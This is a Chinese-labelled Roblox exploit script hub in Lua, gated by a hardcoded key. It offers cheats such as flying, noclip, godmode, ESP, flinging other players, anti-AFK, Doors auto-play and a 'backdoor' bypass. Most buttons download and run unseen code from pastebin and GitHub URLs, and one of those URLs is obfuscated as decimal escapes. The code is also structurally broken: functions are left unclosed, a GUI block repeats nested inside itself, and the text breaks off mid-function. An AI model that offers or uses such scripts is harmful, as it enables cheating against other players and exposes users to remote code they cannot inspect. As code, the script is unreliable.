local UserInputService = game:GetService("UserInputService")

local function CreateGUI(title)
    local gui = Instance.new("ScreenGui")
    gui.Name = "MyGUI"
    gui.ResetOnSpawn = false
    gui.DisplayOrder = 10
    gui.Parent = game.Players.LocalPlayer.PlayerGui
    local frame = Instance.new("Frame")
    frame.Name = "MainFrame"
    frame.BackgroundTransparency = 0
    frame.BackgroundColor3 = Color3.fromRGB(240, 248, 255)
    frame.BorderSizePixel = 0
    frame.Position = UDim2.new(0, 110, 0, -20) 
    frame.Size = UDim2.new(0, 500, 0, 280)
    frame.Parent = gui

    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 10)
    corner.Parent = frame

    local dragging = false
    local startPos, startOffset

    frame.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            startPos = input.Position
            startOffset = frame.Position
            gui.Active = true 
        end
    end)

    frame.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = false
            startPos = nil
            startOffset = nil
            gui.Active = false
        end
    end)

    UserInputService.InputChanged:Connect(function(input)
        if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
            local delta = input.Position - startPos
            frame.Position = UDim2.new(startOffset.X.Scale, startOffset.X.Offset + delta.X, startOffset.Y.Scale,  
                startOffset.Y.Offset + delta.Y)
        end
    end)
    local titleLabel = Instance.new("TextLabel")
    titleLabel.Name = "TitleLabel"
    titleLabel.Size = UDim2.new(1, 0, 0.05, 0.15 * frame.Size.Y.Offset)
    titleLabel.Position = UDim2.new(0, 0, 0.01, 0)
    titleLabel.BackgroundTransparency = 1
    titleLabel.Text = title
    titleLabel.TextColor3 = Color3.new(0, 0, 0)
    titleLabel.TextSize = math.floor(frame.Size.Y.Offset * 0.1)
    titleLabel.Parent = frame
    local disagreeButton = Instance.new("TextButton")
    disagreeButton.Name = "DisagreeButton"
    disagreeButton.Size = UDim2.new(0, 0.4 * frame.Size.X.Offset, 0, 0.15 * frame.Size.Y.Offset)
    disagreeButton.Position = UDim2.new(0, 0.1 * frame.Size.X.Offset, 0,
        frame.Size.Y.Offset - 0.25 * frame.Size.Y.Offset)
    disagreeButton.BackgroundTransparency = 0
    disagreeButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    disagreeButton.Text = "不同意"
    disagreeButton.TextColor3 = Color3.new(255, 0, 0)
    disagreeButton.TextSize = math.floor(frame.Size.Y.Offset * 0.08)
    disagreeButton.Font = Enum.Font.SourceSans
    disagreeButton.Parent = frame
    local disagreeCorner = Instance.new("UICorner")
    disagreeCorner.CornerRadius = UDim.new(0, 10)
    disagreeCorner.Parent = disagreeButton

    local agreeButton = Instance.new("TextButton")
    agreeButton.Name = "AgreeButton"
    agreeButton.Size = UDim2.new(0, 0.4 * frame.Size.X.Offset, 0, 0.15 * frame.Size.Y.Offset)
    agreeButton.Position = UDim2.new(0, frame.Size.X.Offset - 0.5 * frame.Size.X.Offset, 0,
        frame.Size.Y.Offset - 0.25 * frame.Size.Y.Offset)
    agreeButton.BackgroundTransparency = 0
    agreeButton.BackgroundColor3 = Color3.fromRGB(106, 159, 255)
    agreeButton.Text = "同意"
    agreeButton.TextColor3 = Color3.new(255, 255, 255)
    agreeButton.TextSize = math.floor(frame.Size.Y.Offset * 0.08)
    agreeButton.Font = Enum.Font.SourceSans 
    agreeButton.Parent = frame

    
    local agreeFrame = Instance.new("TextLabel")
    agreeFrame.Size = UDim2.new(0.8, 0, 0.5, 0)
    agreeFrame.Position = UDim2.new(0.1, 0, 0.22, 0)
    agreeFrame.BackgroundColor3 = Color3.fromRGB(240, 240, 240)
    agreeFrame.Text = "1.账号封禁,概不负责.\n 2.本脚本含有卡密系统确定执行?.\n 3.更新时间为6月20日下午7:13."
    agreeFrame.TextWrapped = true

    
    agreeFrame.TextSize = 16  


    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 10)
    corner.Parent = agreeFrame

    agreeFrame.Parent = frame

    local agreeCorner = Instance.new("UICorner")
    agreeCorner.CornerRadius = UDim.new(0, 10)
    agreeCorner.Parent = agreeButton
    local minimizeButton = Instance.new("TextButton")
    minimizeButton.Name = "MinimizeButton"
    minimizeButton.Size = UDim2.new(0, 40, 0, 40)
    minimizeButton.Position = UDim2.new(1, -65, 0, 10)
    minimizeButton.BackgroundTransparency = 0
    minimizeButton.BackgroundColor3 = Color3.fromRGB(199, 199, 199)
    minimizeButton.Text = "-"
    minimizeButton.TextSize = 28  
    minimizeButton.TextColor3 = Color3.new(0, 0, 0)
    minimizeButton.Font = Enum.Font.SourceSans
    minimizeButton.Parent = frame

    local isMinimized = false

    local minimizeCorner = Instance.new("UICorner")
    minimizeCorner.CornerRadius = UDim.new(0, 5)
    minimizeCorner.Parent = minimizeButton

    minimizeButton.MouseButton1Click:Connect(function()
        if isMinimized then
            frame.Size = UDim2.new(0, 500, 0, 280)
            titleLabel.Position = UDim2.new(0, 0, 0.01, 0)
            minimizeButton.Text = "-"
            minimizeButton.TextSize = 28
            isMinimized = false
            disagreeButton.Visible = true
            agreeButton.Visible = true
            agreeFrame.Visible = true
        else
            frame.Size = UDim2.new(0, 500, 0, 60)
            titleLabel.Position = UDim2.new(0, 0, 0, 0)
            minimizeButton.Text = "+"
            minimizeButton.TextSize = 28 
            isMinimized = true
            disagreeButton.Visible = false
            agreeButton.Visible = false
            agreeFrame.Visible = false
        end
    end)

    local function AnimateExit()
        local duration = 1
        local startTime = tick()
        local initialSize = frame.Size
        while (tick() - startTime) < duration do
            local elapsedTime = tick() - startTime
            local scale = 1 - elapsedTime / duration
            frame.Size = UDim2.new(initialSize.X.Scale * scale, initialSize.X.Offset * scale,
                initialSize.Y.Scale * scale, initialSize.Y.Offset * scale)
            frame.Position = frame.Position + UDim2.new((1 - scale) / 2, 0, (1 - scale) / 2, 0)
            wait()
        end
        gui:Destroy()
    end
    disagreeButton.MouseButton1Click:Connect(function()
        AnimateExit()
    end)
    agreeButton.MouseButton1Click:Connect(function()
        AnimateExit()
local ScreenGui = Instance.new("ScreenGui")
local UI = Instance.new("Frame")
local Title = Instance.new("TextLabel")
local Frame = Instance.new("Frame")
local Key = Instance.new("TextBox")
local Start = Instance.new("TextButton")

ScreenGui.Parent = game.CoreGui
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

UI.Name = "坤卡密系统"
UI.Parent = ScreenGui
UI.Active = true
UI.BackgroundColor3 = Color3.new(0, 0, 0)
UI.BackgroundTransparency = 0
UI.BorderSizePixel = 3
UI.Position = UDim2.new(0.5, -150, 0.5, -67)
UI.Size = UDim2.new(0, 260, 0, 250)
UI.Draggable = true

Title.Name = "Title"
Title.Parent = UI
Title.BackgroundColor3 = Color3.new(68, 68, 68)
Title.BackgroundTransparency = 1
Title.BorderSizePixel = 2
Title.Position = UDim2.new(0, 0, 0.02, 0)
Title.Size = UDim2.new(1, 0, 0, 50)
Title.Font = Enum.Font.SourceSans
Title.Text = "坤密钥系统"
Title.TextColor3 = Color3.new(0, 0, 255)
Title.TextScaled = true
Title.TextSize = 14
Title.TextWrapped = true

Frame.Parent = Title
Frame.BackgroundColor3 = Color3.new(0, 0, 255)
Frame.BorderSizePixel = 0
Frame.Position = UDim2.new(0.07, 0, 0.9, 0)
Frame.Size = UDim2.new(0.85, 0, 0, 6)

Key.Name = "Key"
Key.Parent = UI
Key.BackgroundColor3 = Color3.new(1, 1, 1)
Key.BorderSizePixel = 0
Key.Position = UDim2.new(0.1, 0, 0.31, 0)
Key.Size = UDim2.new(0.8, 0, 0, 50)
Key.Font = Enum.Font.SourceSans
Key.PlaceholderText = "输入钥密"
Key.Text = ""
Key.TextColor3 = Color3.new(0, 0, 0)
Key.TextScaled = true
Key.TextSize = 14
Key.TextWrapped = true

Start.Name = "Start"
Start.Parent = UI
Start.BackgroundColor3 = Color3.new(0, 0, 255)
Start.BackgroundTransparency = 0
Start.BorderSizePixel = 2
Start.Position = UDim2.new(0.25, 0, 0.65, 0)
Start.Size = UDim2.new(0.5, 0, 0, 45)
Start.Font = Enum.Font.Gotham
Start.Text = "检查卡密"
Start.TextColor3 = Color3.new(0, 0, 0)
Start.TextScaled = true
Start.TextSize = 10
Start.TextWrapped = true

Start.MouseButton1Click:Connect(function()
    if Key.Text == "zhentou114514" then
        ScreenGui:Destroy()
local CoreGui = game:GetService("StarterGui")

CoreGui:SetCore("SendNotification", {
    Title = "枫脚本",
    Text = "在加载(反挂机已开启)",
    Duration = 5, 
})
print("反挂机开启")
		local vu = game:GetService("VirtualUser")
		game:GetService("Players").LocalPlayer.Idled:connect(function()
		   vu:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
		   wait(1)
		   vu:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
		end)
local OrionLib = loadstring(game:HttpGet('https://pastebin.com/raw/qz5Vsxuk'))();

local Window = OrionLib:MakeWindow({Name = "枫脚本", HidePremium = false, SaveConfig = true,IntroText = "枫脚本", ConfigFolder = "看你m"})
local about = Window:MakeTab({
    Name = "信息",
    Icon = "rbxassetid://4483345998",
    PremiumOnly = false
})

about:AddParagraph("您的用户名:"," "..game.Players.LocalPlayer.Name.."")
about:AddParagraph("您的注入器:"," "..identifyexecutor().."")
about:AddParagraph("您当前服务器的ID"," "..game.GameId.."")
local Tab = Window:MakeTab({
  Name = "通用脚本",
  Icon = "rbxassetid://4483345998",
  PremiumOnly = false
  })

 Tab:AddButton({
	Name = "飞行",
	Callback = function()
loadstring(game:HttpGet('https://rentry.co/shadiao_yazifly/raw'))()
end
})

Tab:AddButton({
	Name = "飞行装备（可控制物体）",
	Callback = function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/cbhlyy/lyycbh/main/zaochuan2"))()		
  	end
})

Tab:AddTextbox({
	Name = "移动速度",
	Default = "",
	TextDisappear = true,
	Callback = function(Value)
		game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = Value
	end	 
})

 Tab:AddTextbox({
	Name = "跳跃高度",
	Default = "",
	TextDisappear = true,
	Callback = function(Value)
		game.Players.LocalPlayer.Character.Humanoid.JumpPower = Value
	end	 
})

Tab:AddTextbox({
	Name = "最大血量",
	Default = "",
	TextDisappear = true,
	Callback = function(Value)
		game.Players.LocalPlayer.Character.Humanoid.MaxHealth = Value
	end	 
})

Tab:AddTextbox({
	Name = "当前血量",
	Default = "",
	TextDisappear = true,
	Callback = function(Value)
		game.Players.LocalPlayer.Character.Humanoid.Health = Value
	end	 
})

Tab:AddButton({
	Name = "回满血",
	Callback = function()
game.Players.LocalPlayer.Character.Humanoid.Health = game.Players.LocalPlayer.Character.Humanoid.MaxHealth 
end
})

Tab:AddTextbox({
	Name = "重力设置",
	Default = "",
	TextDisappear = true,
	Callback = function(Value)
		game.Workspace.Gravity = Value
	end
})

Tab:AddButton({
	Name = "Acrylix（通用）",
	Callback = function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/3dsonsuce/acrylix/main/Acrylix'))()
end
})

Tab:AddButton({
	Name = "修改玩家碰撞箱",
	Callback = function()
loadstring(game:HttpGet('https://pastebin.com/raw/JYFXjEVh'))()
end
})

Tab:AddButton({
	Name = "粘墙行走",
	Callback = function()
loadstring(game:HttpGet("https://pastebin.com/raw/zXk4Rq2r"))()
end
})

Tab:AddToggle({
	Name = "夜视",
	Default = false,
	Callback = function(Value)
		if Value then
		    game.Lighting.Ambient = Color3.new(1, 1, 1)
		else
		    game.Lighting.Ambient = Color3.new(0, 0, 0)
		end
	end
})

Tab:AddButton({
	Name = "通用ESP",
	Callback = function()
	loadstring(game:HttpGet('https://raw.githubusercontent.com/Lucasfin000/SpaceHub/main/UESP'))()
	end
})

Tab:AddButton({
	Name = "电脑键盘",
	Callback = function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/advxzivhsjjdhxhsidifvsh/mobkeyboard/main/main.txt", true))()
  	end    
})

Tab:AddToggle({
	Name = "穿墙",
	Default = false,
	Callback = function(Value)
		if Value then
		    Noclip = true
		    Stepped = game.RunService.Stepped:Connect(function()
			    if Noclip == true then
				    for a, b in pairs(game.Workspace:GetChildren()) do
                        if b.Name == game.Players.LocalPlayer.Name then
                            for i, v in pairs(game.Workspace[game.Players.LocalPlayer.Name]:GetChildren()) do
                                if v:IsA("BasePart") then
                                    v.CanCollide = false
                                end
                            end
                        end
                    end
			    else
				    Stepped:Disconnect()
			    end
		    end)
	    else
		    Noclip = false
	    end
	end
})

Tab:AddButton({
	Name = "甩飞别人",
	Callback = function()
     loadstring(game:HttpGet("https://pastebin.com/raw/GnvPVBEi"))()
  	end    
})

Tab:AddButton({
	Name = "转圈fling GUI",
	Callback = function()
loadstring(game:HttpGet('https://pastebin.com/raw/r97d7dS0', true))()
end
})

Tab:AddButton({
  Name = "加速回血",
  Callback = function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/cbhlyy/lyycbh/main/nengliangtiao"))()
  end
})

Tab:AddButton({
    Name="我要紫砂",
    Callback=function()
        game.Players.LocalPlayer.Character.Humanoid.Health=0
HumanDied = true
    end
})

Tab:AddButton({
	Name = "不死但不完全不死（点紫砂去除）",
	Callback = function()
HumanDied = false
end
})

Tab:AddButton({
	Name = "跟踪玩家",
	Callback = function()
      	loadstring(game:HttpGet("https://pastebin.com/raw/F9PNLcXk"))()
  	end
})

Tab:AddButton({
	Name = "伪名说话",
	Callback = function()
loadstring(game:HttpGet(('https://pastefy.ga/zCFEwaYq/raw'),true))()
	end 
})

Tab:AddButton({
	Name = "人物无敌",
	Callback = function()
     loadstring(game:HttpGet('https://pastebin.com/raw/H3RLCWWZ'))()
	end    
})

Tab:AddButton({
	Name = "无敌",
	Callback = function()
local lp = game:GetService "Players".LocalPlayer
if lp.Character:FindFirstChild "Head" then
    local char = lp.Character
    char.Archivable = true
    local new = char:Clone()
    new.Parent = workspace
    lp.Character = new
    wait(2)
    local oldhum = char:FindFirstChildWhichIsA "Humanoid"
    local newhum = oldhum:Clone()
    newhum.Parent = char
    newhum.RequiresNeck = false
    oldhum.Parent = nil
    wait(2)
    lp.Character = char
    new:Destroy()
    wait(1)
    newhum:GetPropertyChangedSignal("Health"):Connect(
        function()
            if newhum.Health <= 0 then
                oldhum.Parent = lp.Character
                wait(1)
                oldhum:Destroy()
            end
        end)
    workspace.CurrentCamera.CameraSubject = char
    if char:FindFirstChild "Animate" then
        char.Animate.Disabled = true
        wait(.1)
        char.Animate.Disabled = false
    end
    lp.Character:FindFirstChild "Head":Destroy()
end
end
})

Tab:AddButton({
	Name = "点击传送工具",
	Callback = function()
mouse = game.Players.LocalPlayer:GetMouse() tool = Instance.new("Tool") tool.RequiresHandle = false tool.Name = "点击传送鸭" tool.Activated:connect(function() local pos = mouse.Hit+Vector3.new(0,2.5,0) pos = CFrame.new(pos.X,pos.Y,pos.Z) game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = pos end) tool.Parent = game.Players.LocalPlayer.Backpack
	end
})
Tab:AddButton({
	Name = "Dex(acreus X可以无视)",
	Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Babyhamsta/RBLX_Scripts/main/Universal/BypassedDarkDexV3.lua", true))()
end
})
local Tab = Window:MakeTab({
    Name = "doors",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})
Tab:AddButton({
	Name = "ctl（作者把它复活了在卡密系统直接点确定）",
	Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/hxb114514/zhentou114514/main/%E7%A6%8F%E7%91%9E%E7%BE%A4%E7%BC%9D%E5%90%88doors%E5%A4%A7%E7%89%9B%E5%85%A8%E6%BA%90%20(1)%20(2).txt"))()
end
})    
Tab:AddButton({
	Name = "ms(未汉化)",
	Callback = function()
loadstring(game:HttpGet(("https://raw.githubusercontent.com/mstudio45/MSDOORS/main/MSHUB_Loader.lua"),true))()
end
})    
Tab:AddButton({
	Name = "ms(最新)",
	Callback = function()
loadstring(game:HttpGet(("https://raw.githubusercontent.com/mstudio45/MSDOORS/main/MSHUB_Loader.lua"),true))()
end
})
Tab:AddButton({
	Name = "低回拉穿墙(已汉化)",
	Callback = function()
loadstring(game:HttpGet("https://github.com/DXuwu/OK/raw/main/clip"))()
end
})
Tab:AddButton({
	Name = "圣光手雷(可以炸图)",
	Callback = function()
loadstring(game:HttpGet("https://pastebin.com/raw/u5B1UjGv"))()
end
})
Tab:AddButton({
	Name = "DXuwu(里面有模式道具,国人制作)",
	Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/DXuwu/test-lol/main/YO.lua"))()
end
})
Tab:AddButton({
	Name = "夜视仪1",
	Callback = function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/DeividComSono/Scripts/main/Scanner.lua'))()
end
})
Tab:AddButton({
	Name = "夜视仪2",
	Callback = function()
loadstring(game:HttpGet("https://pastebin.com/raw/4Vsv1Xwn"))()
end
})
Tab:AddButton({
	Name = "blackking And BobHub汉化",
	Callback = function()
--[[Doors Blackking And BobHub脚本汉化]]loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\54\53\84\119\84\56\106\97"))()
end
})
Tab:AddButton({
	Name = "最强(未汉化)",
	Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/GamingScripter/Darkrai-X/main/Games/Doors"))()
end
})
Tab:AddButton({
	Name = "自定义夜视仪(可能不会执行)",
	Callback = function()
_G.TFPS = 114514 --自定义帧率_G.B = "114514xhxh正版授权" --自定义型号_G.HighRes = trueloadstring(game:HttpGet(('https://raw.githubusercontent.com/XT-CN/UwU/main/table')))()
end
})
Tab:AddButton({
	Name = "地板二(改地图)",
	Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/iCherryKardes/Doors/main/Floor%202%20Mod"))()
end
})
Tab:AddButton({
	Name = "变身怪物(对手机可能有点不友好)",
	Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/ChronoAccelerator/Public-Scripts/main/Morphing/MorphScript.lua"))();
end
})
Tab:AddButton({
	Name = "紫色手电筒(请在开局的时候购买)",
	Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/K0t1n/Public/main/Purple%20Flashlight%20Script.lua"))()
end
})
Tab:AddButton({
	Name = "生成Rebound(硬核)",
	Callback = function()
--该脚本生成的Rebound仅为硬核模式对于此实体的第1次模型整改（Rebound的第2个模型）所遗留的产物

local Reboundcolor = Instance.new("ColorCorrectionEffect",game.Lighting) game.Debris:AddItem(Reboundcolor,24)
                Reboundcolor.Name = "Warn"
                Reboundcolor.TintColor = Color3.fromRGB(65, 138, 255) Reboundcolor.Saturation = -0.7 Reboundcolor.Contrast = 0.2
                game.TweenService:Create(Reboundcolor,TweenInfo.new(15),{TintColor = Color3.fromRGB(255, 255, 255),Saturation = 0, Contrast = 0}):Play()
local TweenService = game:GetService("TweenService")
local TW = TweenService:Create(game.Lighting.MainColorCorrection, TweenInfo.new(5),{TintColor = Color3.fromRGB(255, 255, 255)})
TW:Play()
local cue1 = Instance.new("Sound")
cue1.Parent = game.Workspace
cue1.Name = "Scream"
cue1.SoundId = "rbxassetid://9114397505"
local distort = Instance.new("DistortionSoundEffect")
distort.Parent = cue1
distort.Level = 1
local distort2 = Instance.new("DistortionSoundEffect")
distort2.Parent = cue1
distort2.Level = 1
local pitch = Instance.new("PitchShiftSoundEffect")
pitch.Parent = cue1
pitch.Octave = 0.5
local pitch2 = Instance.new("PitchShiftSoundEffect")
pitch2.Parent = cue1
pitch2.Octave = 0.5
local pitch3 = Instance.new("PitchShiftSoundEffect")
pitch3.Parent = cue1
pitch3.Octave = 0.5
cue1.Volume = 0.1
cue1:Play()
local cue2 = Instance.new("Sound")
cue2.Parent = game.Workspace
cue2.Name = "Spawn"
cue2.SoundId = "rbxassetid://9114221327"
cue2.Volume = 3
cue2:Play()
local CameraShaker = require(game.ReplicatedStorage.CameraShaker)
local camara = game.Workspace.CurrentCamera
local camShake = CameraShaker.new(Enum.RenderPriority.Camera.Value, function(shakeCf)
    camara.CFrame = camara.CFrame * shakeCf
end)
end
})
Tab:AddButton({
	Name = "脚本模式但是不知道叫什么名字",
	Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/munciseek/DOORS-mode/main/ScripV2"))()
end
})
Tab:AddButton({
	Name = "rooms自动过关，但是两倍速(作者没有试过)",
	Callback = function()
-- 夜，我帮你翻译的
-- 谢谢我

if game.PlaceId ~= 6839171747 or game.ReplicatedStorage.GameData.Floor.Value ~= "Rooms" then
	game.StarterGui:SetCore("SendNotification", { Title = "无效位置"; Text = "检测到的游戏似乎不是房间" })
	
	local Sound = Instance.new("Sound")
	Sound.Parent = game.SoundService
	Sound.SoundId = "rbxassetid://550209561"
	Sound.Volume = 5
	Sound.PlayOnRemove = true
	Sound:Destroy()
	
	return
elseif workspace:FindFirstChild("PathFindPartsFolder") then
	game.StarterGui:SetCore("SendNotification", { Title = "Warning"; Text = "检查是QQ用户1289603470（凉）" })
	
	local Sound = Instance.new("Sound")
	Sound.Parent = game.SoundService
	Sound.SoundId = "rbxassetid://550209561"
	Sound.Volume = 5
	Sound.PlayOnRemove = true
	Sound:Destroy()

	return
end

local PathfindingService = game:GetService("PathfindingService")
local VirtualInputManager = game:GetService('VirtualInputManager')
local LocalPlayer = game.Players.LocalPlayer
local LatestRoom = game.ReplicatedStorage.GameData.LatestRoom

local Cooldown = false

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Parent = game.CoreGui

local TextLabel = Instance.new("TextLabel")
TextLabel.Parent = ScreenGui

TextLabel.Size = UDim2.new(0,350,0,100)
TextLabel.TextSize = 48
TextLabel.TextStrokeColor3 = Color3.new(1,1,1)
TextLabel.TextStrokeTransparency = 0
TextLabel.BackgroundTransparency = 1

local GC = getconnections or get_signal_cons
if GC then
    for i,v in pairs(GC(LocalPlayer.Idled)) do
        if v["Disable"] then
            v["Disable"](v)
        elseif v["Disconnect"] then
            v["Disconnect"](v)
        end
    end
end

local Folder = Instance.new("Folder")
Folder.Parent = workspace
Folder.Name = "PathFindPartsFolder"

if LocalPlayer.PlayerGui.MainUI.Initiator.Main_Game.RemoteListener.Modules:FindFirstChild("A90") then
    LocalPlayer.PlayerGui.MainUI.Initiator.Main_Game.RemoteListener.Modules.A90.Name = "lol" -- Fuck you A90
end

function getLocker()
    local Closest

    for i,v in pairs(workspace.CurrentRooms:GetDescendants()) do
        if v.Name == "Rooms_Locker" then
            if v:FindFirstChild("Door") and v:FindFirstChild("HiddenPlayer") then
                if v.HiddenPlayer.Value == nil then
                    if v.Door.Position.Y > -3 then -- Prevents going to the lower lockers in the room with the bridge 
                        if Closest == nil then
                            Closest = v.Door
                        else
                            if (LocalPlayer.Character.HumanoidRootPart.Position - v.Door.Position).Magnitude < (Closest.Position - LocalPlayer.Character.HumanoidRootPart.Position).Magnitude then
                                Closest = v.Door
                            end
                        end
                    end
                end
            end
        end
    end
    return Closest
end

function getPath()
    local Part
	
    local Entity = workspace:FindFirstChild("A60") or workspace:FindFirstChild("A120")
    if Entity and Entity.Main.Position.Y > -4 then
        Part = getLocker()
    else
        Part = workspace.CurrentRooms[LatestRoom.Value].Door.Door
    end
    return Part
end

LatestRoom:GetPropertyChangedSignal("Value"):Connect(function()
    TextLabel.Text = "你的房间号为: A-00 "..math.clamp(LatestRoom.Value, 1,1000)

    if LatestRoom.Value ~= 210 then
        LocalPlayer.DevComputerMovementMode = Enum.DevComputerMovementMode.Scriptable
    else
        LocalPlayer.DevComputerMovementMode = Enum.DevComputerMovementMode.KeyboardMouse
	
        Folder:ClearAllChildren()
    
        local Sound = Instance.new("Sound")
        Sound.Parent = game.SoundService
        Sound.SoundId = "rbxassetid://4590662766"
        Sound.Volume = 3
        Sound.PlayOnRemove = true
        Sound:Destroy()
        
        game.StarterGui:SetCore("SendNotification", { Title = "youtube.com/geoduude"; Text = "老子（114514xhxh)帮你翻译的" })
        return
    end
end)

game:GetService("RunService").RenderStepped:connect(function()
    LocalPlayer.Character.HumanoidRootPart.CanCollide = false
    LocalPlayer.Character.Collision.CanCollide = false
    LocalPlayer.Character.Collision.Size = Vector3.new(8,LocalPlayer.Character.Collision.Size.Y,8)

    LocalPlayer.Character.Humanoid.WalkSpeed = 21

    local Path = getPath()
    
    local Entity = workspace:FindFirstChild("A60") or workspace:FindFirstChild("A120")
    if Entity then
        if Path then
            if Path.Parent.Name == "Rooms_Locker" then
                if Entity.Main.Position.Y > -4 then
                    if (LocalPlayer.Character.HumanoidRootPart.Position - Path.Position).Magnitude < 2 then
                        if LocalPlayer.Character.HumanoidRootPart.Anchored == false then
                            fireproximityprompt(Path.Parent.HidePrompt)
                        end
                    end
                end
            end
        end
        if Entity.Main.Position.Y < -4 then
            if LocalPlayer.Character.HumanoidRootPart.Anchored == true then
                LocalPlayer.Character:SetAttribute("Hiding", false)
            end
        end
    else
        if LocalPlayer.Character.HumanoidRootPart.Anchored == true then
            LocalPlayer.Character:SetAttribute("Hiding", false)
        end
    end
end)

while true do

    local Destination = getPath()

    local path = PathfindingService:CreatePath({ WaypointSpacing = 1, AgentRadius = 0.1, AgentCanJump = false })
    path:ComputeAsync(LocalPlayer.Character.HumanoidRootPart.Position - Vector3.new(0,3,0), Destination.Position)
    local Waypoints = path:GetWaypoints()

    if path.Status ~= Enum.PathStatus.NoPath then

        Folder:ClearAllChildren()

        for _, Waypoint in pairs(Waypoints) do
            local part = Instance.new("Part")
            part.Size = Vector3.new(1,1,1)
            part.Position = Waypoint.Position
            part.Shape = "Cylinder"
            part.Rotation = Vector3.new(0,0,90)
            part.Material = "SmoothPlastic"
            part.Anchored = true
            part.CanCollide = false
            part.Parent = Folder
        end

        for _, Waypoint in pairs(Waypoints) do
            if LocalPlayer.Character.HumanoidRootPart.Anchored == false then
                LocalPlayer.Character.Humanoid:MoveTo(Waypoint.Position)
                LocalPlayer.Character.Humanoid.MoveToFinished:Wait()
            end
        end
    end
end
end
})
Tab:AddButton({
	Name = "极端",
	Callback = function()
loadstring(game:HttpGet('https://github.com/HollowedOutMods/MayhemMode/blob/main/loader.lua?raw=true'))()
end
})
Tab:AddButton({
	Name = "巨魔",
	Callback = function()
loadstring(game:HttpGet("https://glot.io/snippets/gotfeffesc/raw/main.lua"))()
end
})
Tab:AddButton({
	Name = "实体生成器",
	Callback = function()
loadstring(game:HttpGet("https://pastebin.com/raw/KW0HiMpJ"))()
end
})
Tab:AddButton({
	Name = "The backdoor(作者还是没有试过)",
	Callback = function()
G.IY = true -- Infinite Yield
_G.Bypass = true -- Bypass haste and Backdoor lookman
loadstring(game:HttpGet("https://raw.githubusercontent.com/iimateiYT/Scripts/main/Backdoors.lua"))()
end
})
Tab:AddButton({
	Name = "AIRDOORS",
	Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/BINjiaobzx6/BINjiao/main/AIRDOORS%E6%B5%8B%E8%AF%95%E7%89%88.txt"))()
end
})
Tab:AddButton({
	Name = "微山",
	Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/weishanteam/Script/main/doors/WeiShan_Loader.lua"))()
end
})
Tab:AddButton({
	Name = "脚本模式，但是还是不知道叫什么名字",
	Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Drop56796/Mode-Version/main/Mode.lua"))()
end
})
local Tab = Window:MakeTab({
    Name = "别人的脚本",
	Icon = "rbxassetid://4483345998",
	PremiumOnly = false
})
Tab:AddButton({
	Name = "XC(卡密x)",
	Callback = function()
local UserInputService = game:GetService("UserInputService")

local function CreateGUI(title)
    local gui = Instance.new("ScreenGui")
    gui.Name = "MyGUI"
    gui.ResetOnSpawn = false
    gui.DisplayOrder = 10
    gui.Parent = game.Players.LocalPlayer.PlayerGui
    local frame = Instance.new("Frame")
    frame.Name = "MainFrame"
    frame.BackgroundTransparency = 0
    frame.BackgroundColor3 = Color3.fromRGB(240, 248, 255)
    frame.BorderSizePixel = 0
    frame.Position = UDim2.new(0, 110, 0, -20) 
    frame.Size = UDim2.new(0, 500, 0, 280)
    frame.Parent = gui

    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 10)
    corner.Parent = frame

    local dragging = false
    local startPos, startOffset

    frame.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            startPos = input.Position
            startOffset = frame.Position
            gui.Active = true 
        end
    end)

    frame.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = false
            startPos = nil
            startOffset = nil
            gui.Active = false
        end
    end)

    UserInputService.InputChanged:Connect(function(input)
        if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
            local delta = input.Position - startPos
            frame.Position = UDim2.new(startOffset.X.Scale, startOffset.X.Offset + delta.X, startOffset.Y.Scale,  
                startOffset.Y.Offset + delta.Y)
        end
    end)
    local titleLabel = Instance.new("TextLabel")
    titleLabel.Name = "TitleLabel"
    titleLabel.Size = UDim2.new(1, 0, 0.05, 0.15 * frame.Size.Y.Offset)
    titleLabel.Position = UDim2.new(0, 0, 0.01, 0)
    titleLabel.BackgroundTransparency = 1
    titleLabel.Text = title
    titleLabel.TextColor3 = Color3.new(0, 0, 0)
    titleLabel.TextSize = math.floor(frame.Size.Y.Offset * 0.1)
    titleLabel.Parent = frame
    local disagreeButton = Instance.new("TextButton")
    disagreeButton.Name = "DisagreeButton"
    disagreeButton.Size = UDim2.new(0, 0.4 * frame.Size.X.Offset, 0, 0.15 * frame.Size.Y.Offset)
